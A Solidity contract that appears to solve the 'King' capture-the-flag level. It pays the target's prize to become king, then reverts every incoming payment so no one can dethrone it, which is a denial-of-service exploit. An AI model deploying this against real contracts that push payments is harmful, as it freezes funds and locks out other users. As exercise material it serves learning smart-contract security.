// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint256);
}

contract SolveKing {
    error PaymentError();

    constructor(address _target) payable {
        require(isContract(_target), "Target is not a contract");

        IKing kingContract = IKing(_target);
        require(msg.value >= kingContract.prize());

        // transfer amount
        (bool success,) = _target.call{value: msg.value}("");
        require(success, "Call failed");
    }

    receive() external payable {
        revert PaymentError();
    }

    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}
